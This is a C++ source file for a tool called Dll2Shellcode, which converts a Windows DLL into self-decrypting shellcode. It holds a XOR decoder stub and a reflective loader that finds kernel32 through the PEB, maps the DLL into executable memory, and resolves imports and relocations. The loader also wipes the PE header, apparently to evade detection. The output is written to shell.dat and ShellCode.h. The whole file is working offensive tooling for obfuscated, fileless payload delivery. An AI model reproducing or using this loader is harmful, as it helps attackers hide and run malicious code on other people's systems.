// dll2shellcode.cpp : Defines the entry point for the console application.

#include <Windows.h>
#include <iostream>
#include <string>
using namespace std;

DWORD dwFlag =0xffeeddcc;

#define  GetAlignedSize(nOrigin, nAlignment)  ((nOrigin) + (nAlignment) - 1) / (nAlignment) * (nAlignment)

typedef BOOL	(APIENTRY *ProcDllMain)		( HINSTANCE, DWORD, LPVOID);
typedef FARPROC (WINAPI *MyGetProcAddress)	( HMODULE hModule, LPCSTR lpProcName);
typedef LPVOID  (WINAPI *MyVirtualAlloc)	( LPVOID lpAddress,SIZE_T dwSize,DWORD flAllocationType,DWORD flProtect);
typedef BOOL    (WINAPI *MyVirtualProtect)	( LPVOID lpAddress,SIZE_T dwSize,DWORD flNewProtect,PDWORD lpflOldProtect);
typedef HMODULE (WINAPI *MyGetModuleHandleA)( LPCSTR lpModuleName );
typedef HMODULE (WINAPI *MyLoadLibraryA)	( LPCSTR lpLibFileName );
typedef BOOL    (WINAPI *MyVirtualFree)		( LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType );


__declspec(naked) void XorShell()
{
	_asm
	{
		call lab1;
lab1:
		pop ebx;
		add ebx,0x1b;
		nop;
		nop;
		nop;
		xor ecx,ecx;
		mov al,0x25;//xor key
lab2:
		XOR BYTE PTR DS:[ECX+EBX],AL;
		INC ecx;
		CMP ECX,0x12345678;//shell header + dll file = size
		jl lab2;
		nop;
		nop;
		nop;
	}
}

//void __declspec(naked) END_XorShell(void) {}

void WINAPI ShellHeader()
{
	//定位dll文件起始地址
	LPBYTE lpFileData;
	_asm
	{
		call SELF
SELF:
		pop lpFileData
	}

	for (int i = 0 ; i < 0xffff; i++)
	{
		if (lpFileData[i] == 0xcc && lpFileData[i+1] == 0xdd && lpFileData[i + 2] == 0xee && lpFileData[i+3 ] == 0xff)
		{
			lpFileData += i;
			lpFileData += 4;
			break;
		}
	}

	HMODULE hMod;
	MyGetProcAddress	myGetProcAddress;
	MyLoadLibraryA		myLoadLibrayA;

	MyVirtualAlloc		myVirtualAlloc;
	MyVirtualFree		myVirtualFree;
	MyVirtualProtect	myVirtualProtect;
	MyGetModuleHandleA	myGetModuleHandleA;

	//得到Kernel32句柄和GetProcAddress地址
	__asm{

		pushad    //保存寄存器

		mov eax, dword ptr fs:[0x30];  
		mov eax, dword ptr [eax+0xC];  
		mov eax, dword ptr [eax+0xC];  
		mov eax, dword ptr [eax];  
		mov eax, dword ptr [eax];  
		mov eax, dword ptr [eax+0x18];  

		mov hMod,eax
		mov myGetProcAddress,eax

		push ebp

		mov ebp,eax                         // Kernel.dll基址  
		mov eax,dword ptr ss:[ebp+3CH]      // eax=PE首部  
		mov edx,dword ptr ds:[eax+ebp+78H]  //  
		add edx,ebp                         // edx=引出表地址  
		mov ecx,dword ptr ds:[edx+18H]      // ecx=导出函数个数，NumberOfFunctions  
		mov ebx,dword ptr ds:[edx+20H]      //  
		add ebx,ebp                         // ebx=函数名地址，AddressOfName  
start:                                      //  
		dec ecx                             // 循环的开始  
		mov esi,dword ptr ds:[ebx+ecx*4]    //  
		add esi,ebp                         //  
		mov eax,0x50746547                  //  
		cmp dword ptr ds:[esi],eax          // 比较PteG  
		jnz start                           //  
		mov eax,0x41636F72                  //  
		cmp dword ptr ds:[esi+4],eax        // 比较Acor，通过GetProcA几个字符就能确定是GetProcAddress  
		jnz start                           //  
		mov ebx,dword ptr ds:[edx+24H]      //  
		add ebx,ebp                         //  
		mov cx,word ptr ds:[ebx+ecx*2]      //  
		mov ebx,dword ptr ds:[edx+1CH]      //  
		add ebx,ebp                         //  
		mov eax,dword ptr ds:[ebx+ecx*4]    //  
		add eax,ebp                         // eax 现在是GetProcAddress地址  
		mov ebx,eax                         // GetProcAddress地址存入ebx，如果写ShellCode的话以后还可以

		pop ebp

		push ebx
		pop myGetProcAddress

		popad
	}
	char szLoadLibrary[] = {'L','o','a','d','L','i','b','r','a','r','y','A','\0'};
	myLoadLibrayA = (MyLoadLibraryA)myGetProcAddress(hMod,szLoadLibrary);
	char szVirtualAlloc[] = {'V','i','r','t','u','a','l','A','l','l','o','c','\0'};
	myVirtualAlloc = (MyVirtualAlloc)myGetProcAddress(hMod,szVirtualAlloc);
	char szVirtualFree[] = {'V','i','r','t','u','a','l','F','r','e','e','\0'};
	myVirtualFree = (MyVirtualFree)myGetProcAddress(hMod,szVirtualFree);
	char szVirtualProtect[] = {'V','i','r','t','u','a','l','P','r','o','t','e','c','t','\0'};
	myVirtualProtect = (MyVirtualProtect)myGetProcAddress(hMod,szVirtualProtect);
	char szGetModuleHandleA[] = {'G','e','t','M','o','d','u','l','e','H','a','n','d','l','e','A','\0'};
	myGetModuleHandleA = (MyGetModuleHandleA)myGetProcAddress(hMod,szGetModuleHandleA);
	
	//MemLoadDll

	PIMAGE_DOS_HEADER		pDosHeader;
	PIMAGE_NT_HEADERS		pNTHeader;
	PIMAGE_SECTION_HEADER	pSectionHeader;


	pDosHeader = (PIMAGE_DOS_HEADER)lpFileData;  // DOS头
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return;  //0x5A4D : MZ
	}
	//取得pe头
	pNTHeader = (PIMAGE_NT_HEADERS)((PBYTE)lpFileData + pDosHeader->e_lfanew); // PE头
	if (pNTHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		return;  //0x00004550 : PE00
	}
	if ((pNTHeader->FileHeader.Characteristics & IMAGE_FILE_DLL) == 0) //0x2000  : File is a DLL
	{
		return;  
	}
	if ((pNTHeader->FileHeader.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE) == 0) //0x0002 : 指出文件可以运行
	{
		return;
	}
	if (pNTHeader->FileHeader.SizeOfOptionalHeader != sizeof(IMAGE_OPTIONAL_HEADER))
	{
		return;
	}
	//取得节表（段表）
	pSectionHeader = (PIMAGE_SECTION_HEADER)((PBYTE)pNTHeader + sizeof(IMAGE_NT_HEADERS));
	
	// 计算所需的加载空间  
	int nImageSize = 0;

	if (pNTHeader == NULL)
	{
		return;
	}
	int nAlign = pNTHeader->OptionalHeader.SectionAlignment; //段对齐字节数
	// 计算所有头的尺寸。包括dos, coff, pe头 和 段表的大小
	nImageSize = GetAlignedSize(pNTHeader->OptionalHeader.SizeOfHeaders, nAlign);
	// 计算所有节的大小
	for (int i=0; i < pNTHeader->FileHeader.NumberOfSections; ++i)
	{
		//得到该节的大小
		int nCodeSize = pSectionHeader[i].Misc.VirtualSize ;
		int nLoadSize = pSectionHeader[i].SizeOfRawData;
		int nMaxSize = (nLoadSize > nCodeSize) ? (nLoadSize) : (nCodeSize);
		int nSectionSize = GetAlignedSize(pSectionHeader[i].VirtualAddress + nMaxSize, nAlign);

		if (nImageSize < nSectionSize)
		{
			nImageSize = nSectionSize;  //Use the Max;
		}
	}

	if (nImageSize == 0)
	{
		return;
	}
	// 分配虚拟内存
	void *pMemoryAddress = myVirtualAlloc(NULL, nImageSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (pMemoryAddress == NULL)
	{
		return;
	}
	else
	{
		LPVOID pDest = pMemoryAddress;
		LPVOID pSrc = lpFileData;

		// 计算需要复制的PE头+段表字节数
		int  nHeaderSize = pNTHeader->OptionalHeader.SizeOfHeaders;
		int  nSectionSize = pNTHeader->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
		int  nMoveSize = nHeaderSize + nSectionSize;
		

		for (int i = 0; i < nMoveSize ; i++)
		{
			((char*)pDest)[i] = ((char*)pSrc)[i];
		}

		//复制每个节
		for (int i=0; i < pNTHeader->FileHeader.NumberOfSections; ++i)
		{
			if (pSectionHeader[i].VirtualAddress == 0 || pSectionHeader[i].SizeOfRawData == 0)
			{
				continue;
			}
			// 定位该节在内存中的位置
			void *pSectionAddress = (void *)((PBYTE)pDest + pSectionHeader[i].VirtualAddress);

			for (int j = 0; j < pSectionHeader[i].SizeOfRawData ; j++)
			{
				((char*)pSectionAddress)[j] = ((char*)((PBYTE)pSrc + pSectionHeader[i].PointerToRawData))[j];
			}
		}
		//修正指针，指向新分配的内存
		//新的dos头
		pDosHeader = (PIMAGE_DOS_HEADER)pDest;
		//新的pe头地址
		pNTHeader = (PIMAGE_NT_HEADERS)((PBYTE)pDest + (pDosHeader->e_lfanew));
		//新的节表地址
		pSectionHeader = (PIMAGE_SECTION_HEADER)((PBYTE)pNTHeader + sizeof(IMAGE_NT_HEADERS));

		//重定位信息
		if (pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress > 0
			&& pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0)
		{
			/************************************************************************/
			/*                          修复重定位信息                              */
			/************************************************************************/

			void *pNewBase  = pMemoryAddress;

			/* 重定位表的结构：
			// DWORD sectionAddress, DWORD size (包括本节需要重定位的数据)
			// 例如 1000节需要修正5个重定位数据的话，重定位表的数据是
			// 00 10 00 00   14 00 00 00      xxxx xxxx xxxx xxxx xxxx 0000
			// -----------   -----------      ----
			// 给出节的偏移  总尺寸=8+6*2     需要修正的地址           用于对齐4字节
			// 重定位表是若干个相连，如果address 和 size都是0 表示结束
			// 需要修正的地址是12位的，高4位是形态字，intel cpu下是3
			*/
			//假设NewBase是0x600000,而文件中设置的缺省ImageBase是0x400000,则修正偏移量就是0x200000
	
			//注意重定位表的位置可能和硬盘文件中的偏移地址不同，应该使用加载后的地址
			PIMAGE_BASE_RELOCATION pLoc = (PIMAGE_BASE_RELOCATION)((unsigned long)pNewBase 
				+ pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

			while ((pLoc->VirtualAddress + pLoc->SizeOfBlock) != 0) //开始扫描重定位表
			{
				WORD *pLocData = (WORD *)((PBYTE)pLoc + sizeof(IMAGE_BASE_RELOCATION));
				//计算本节需要修正的重定位项（地址）的数目
				int nNumberOfReloc = (pLoc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))/sizeof(WORD);

				for ( int i=0 ; i < nNumberOfReloc; i++)
				{
					// 每个WORD由两部分组成。高4位指出了重定位的类型，WINNT.H中的一系列IMAGE_REL_BASED_xxx定义了重定位类型的取值。
					// 低12位是相对于VirtualAddress域的偏移，指出了必须进行重定位的位置。
					if ((DWORD)(pLocData[i] & 0x0000F000) == 0x0000A000)
					{
						// 64位dll重定位，IMAGE_REL_BASED_DIR64
						// 对于IA-64的可执行文件，重定位似乎总是IMAGE_REL_BASED_DIR64类型的。
		#ifdef _WIN64
						ULONGLONG* pAddress = (ULONGLONG *)((PBYTE)pNewBase + pLoc->VirtualAddress + (pLocData[i] & 0x0FFF));
						ULONGLONG ullDelta = (ULONGLONG)pNewBase - pNTHeader->OptionalHeader.ImageBase;
						*pAddress += ullDelta;
		#endif
					}
					else if ((DWORD)(pLocData[i] & 0x0000F000) == 0x00003000) //这是一个需要修正的地址
					{
						// 32位dll重定位，IMAGE_REL_BASED_HIGHLOW
						// 对于x86的可执行文件，所有的基址重定位都是IMAGE_REL_BASED_HIGHLOW类型的。
		#ifndef _WIN64
						DWORD* pAddress = (DWORD *)((PBYTE)pNewBase + pLoc->VirtualAddress + (pLocData[i] & 0x0FFF));
						DWORD dwDelta = (DWORD)pNewBase - pNTHeader->OptionalHeader.ImageBase;
						*pAddress += dwDelta;
		#endif
					}
				}
				//转移到下一个节进行处理
				pLoc = (PIMAGE_BASE_RELOCATION)((PBYTE)pLoc + pLoc->SizeOfBlock);
			}

			/************************************************************************/
			/*                          OVER                                        */
			/************************************************************************/
		}
		/************************************************************************/
		/*                             填充引入地址表                           */
		/************************************************************************/

		void* pImageBase = pMemoryAddress;
		BOOL ret = FALSE;


		// 引入表实际上是一个 IMAGE_IMPORT_DESCRIPTOR 结构数组，全部是0表示结束
		// 数组定义如下：
		// 
		// DWORD   OriginalFirstThunk;         // 0表示结束，否则指向未绑定的IAT结构数组
		// DWORD   TimeDateStamp; 
		// DWORD   ForwarderChain;             // -1 if no forwarders
		// DWORD   Name;                       // 给出dll的名字
		// DWORD   FirstThunk;                 // 指向IAT结构数组的地址(绑定后，这些IAT里面就是实际的函数地址)
		unsigned long nOffset = pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress ;

		if (nOffset == 0)
		{
			ret = TRUE; //No Import Table
		}

		PIMAGE_IMPORT_DESCRIPTOR pID = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)pImageBase + nOffset);

		while (pID->Characteristics != 0)
		{
			PIMAGE_THUNK_DATA pRealIAT = (PIMAGE_THUNK_DATA)((PBYTE)pImageBase + pID->FirstThunk);
			PIMAGE_THUNK_DATA pOriginalIAT = (PIMAGE_THUNK_DATA)((PBYTE)pImageBase + pID->OriginalFirstThunk);
			//获取dll的名字
#define NAME_BUF_SIZE 256

			char szBuf[NAME_BUF_SIZE]; //dll name;
			BYTE* pName = (BYTE*)((PBYTE)pImageBase + pID->Name);
			int i=0;

			for (i=0; i<NAME_BUF_SIZE; i++)
			{
				if (pName[i] == 0)
				{
					break;
				}
				szBuf[i] = pName[i];
			}
			if (i >= NAME_BUF_SIZE)
			{
				ret = FALSE;  // bad dll name
			}
			else
			{
				szBuf[i] = 0;
			}

			HMODULE hDll = myGetModuleHandleA(szBuf);

			if (hDll == NULL)
			{
				hDll = myLoadLibrayA(szBuf);
				if (hDll == NULL) ret = FALSE;
				//return FALSE; //NOT FOUND DLL
			}
			//获取DLL中每个导出函数的地址，填入IAT
			//每个IAT结构是 ：
			// union { PBYTE  ForwarderString;
			//   PDWORD Function;
			//   DWORD Ordinal;
			//   PIMAGE_IMPORT_BY_NAME  AddressOfData;
			// } u1;
			// 长度是一个DWORD ，正好容纳一个地址。
			for (i=0; ; i++)
			{
				if (pOriginalIAT[i].u1.Function == 0)
				{
					break;
				}

				FARPROC lpFunction = NULL;

				if (pOriginalIAT[i].u1.Ordinal & IMAGE_ORDINAL_FLAG) //这里的值给出的是导出序号
				{
					lpFunction = myGetProcAddress(hDll, (LPCSTR)(pOriginalIAT[i].u1.Ordinal & 0x0000FFFF));
				}
				else //按照名字导入
				{
					//获取此IAT项所描述的函数名称
					PIMAGE_IMPORT_BY_NAME pByName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)pImageBase + (pOriginalIAT[i].u1.AddressOfData));

					lpFunction = myGetProcAddress(hDll, (char *)pByName->Name);
				}
				if (lpFunction != NULL)   //找到了！
				{
#ifdef _WIN64
					pRealIAT[i].u1.Function = (ULONGLONG)lpFunction;
#else
					pRealIAT[i].u1.Function = (DWORD)lpFunction;
#endif
				}
				else
				{
					ret = FALSE;
				}
			}

			//move to next 
			pID = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)pID + sizeof(IMAGE_IMPORT_DESCRIPTOR));
		}

		ret = TRUE;

		/************************************************************************/
		/*                             OVER                                     */
		/************************************************************************/

		if (!ret) //修正引入地址表失败
		{
			myVirtualFree(pMemoryAddress, 0, MEM_RELEASE);
			return;
		}
		//修改页属性。应该根据每个页的属性单独设置其对应内存页的属性。这里简化一下。
		//统一设置成一个属性PAGE_EXECUTE_READWRITE
		unsigned long unOld;

		myVirtualProtect(pMemoryAddress, nImageSize, PAGE_EXECUTE_READWRITE, &unOld);
	}
	//修正基地址
#ifdef WIN32
	pNTHeader->OptionalHeader.ImageBase = (DWORD)pMemoryAddress;
#else
	pNTHeader->OptionalHeader.ImageBase = (ULONGULONG)pMemoryAddress;
#endif
	//接下来要调用一下dll的入口函数，做初始化工作。
	ProcDllMain pDllMain = (ProcDllMain)(pNTHeader->OptionalHeader.AddressOfEntryPoint + (PBYTE)pMemoryAddress);

	//清空pe头 你懂得
	for (int i = 0; i < 0x1000 ; i++)
	{
		((BYTE*)pMemoryAddress)[i] = 0x00;
	}
	


	//传递一个镜像的大小 自己可以释放掉
	BOOL InitResult = pDllMain((HINSTANCE)pMemoryAddress, DLL_PROCESS_ATTACH, (LPVOID)nImageSize);

	if (!InitResult) //初始化失败
	{
		pDllMain((HINSTANCE)pMemoryAddress, DLL_PROCESS_DETACH, 0);
		myVirtualFree(pMemoryAddress, 0, MEM_RELEASE);
		pDllMain = NULL;
		return;
	}
	return;
}


void WriteHeader(char *szPath,BYTE *bCode,DWORD dwCode_size)
{
	int	cols = 16;
	FILE *	fp = NULL;
	fp = fopen((szPath), ("w+b"));

	char * banner = "Generated by Dll2Shellcode v1.0 ----by:w1nds";

	fprintf(fp,
		"// %s\r\n\r\n"
		"// Length: 0x%08X (bytes)\r\n"
		"unsigned char ShellCode[%d] =\r\n"
		"{\r\n",
		banner, dwCode_size, dwCode_size);

	for ( DWORD i = 0; i < dwCode_size; i++)
	{
		if (0 == i % cols && i)
		{
			fprintf(fp, "\r\n");
		}

		fprintf(fp, "0x%02X%s", bCode[i] , i == (dwCode_size - 1) ? " " : ", ");
	}
	fprintf(fp, "\r\n};\r\n");
	fclose(fp);
}


int main(int argc, char* argv[])
{
	cout<<"dllpath:";
	string strDllpath;
	getline(cin,strDllpath);
	cout<<endl;
	HANDLE hFile = CreateFile(strDllpath.c_str(),GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		cout<<"failed!"<<endl;
		return 0;
	}
	DWORD dwFileSize = GetFileSize(hFile,0);
	BYTE *bFileBuf = new BYTE[dwFileSize];
	DWORD dwReaded = 0;
	ReadFile(hFile,bFileBuf,dwFileSize,&dwReaded,0);
	CloseHandle(hFile);

	//make
	
	DWORD dwXorShellSize = (DWORD)ShellHeader-(DWORD)XorShell;
	DWORD dwShellHeaderSize = (DWORD)WriteHeader-(DWORD)ShellHeader;
	DWORD dwShellCodeLen = dwXorShellSize+dwShellHeaderSize+dwFileSize+4;//4字节标志


	BYTE *bOut = new BYTE[dwShellCodeLen];
	ZeroMemory(bOut,dwShellCodeLen);
	memcpy(bOut,XorShell,dwXorShellSize);

	//patch xor shell
	DWORD dwPatchSize = dwShellHeaderSize+dwFileSize+4;
	for (int i = 0 ; i < dwXorShellSize; i++)
	{
		if (bOut[i] == 0x78 && bOut[i+1] == 0x56 && bOut[i + 2] == 0x34 && bOut[i+3 ] == 0x12)
		{
			memcpy(&bOut[i],&dwPatchSize,4);
			break;
		}
	}

	
	memcpy(bOut+dwXorShellSize,ShellHeader,dwShellHeaderSize);
	memcpy(bOut+dwXorShellSize+dwShellHeaderSize,&dwFlag,4);
	memcpy(bOut+dwXorShellSize+dwShellHeaderSize+4,bFileBuf,dwFileSize);

	for (int i=0;i<(dwPatchSize);i++)
	{
		*(bOut+dwXorShellSize+i) = 0x25^bOut[dwXorShellSize+i];//xor key
	}

	//generate binary file and header file

	hFile = CreateFileA("shell.dat",GENERIC_WRITE,FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	if (hFile==INVALID_HANDLE_VALUE)
	{
		cout<<"make binary file failed!"<<endl;
	}
	WriteFile(hFile,bOut,dwShellCodeLen,&dwReaded,NULL);
	CloseHandle(hFile);

	WriteHeader("ShellCode.h",bOut,dwShellCodeLen);
	
	cout<<"ok!"<<endl;
	

	//call test
	/*
	LPVOID pAddr = VirtualAlloc(NULL,dwShellCodeLen,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
	memcpy(pAddr,bOut,dwShellCodeLen);

	_asm
	{
		mov eax,pAddr;
		call eax;
	}
	VirtualFree(pAddr,0,MEM_RELEASE); //MEM_DECOMMIT

	*/
	delete []bFileBuf;
	delete []bOut;

	system("pause");
	return 0;
}

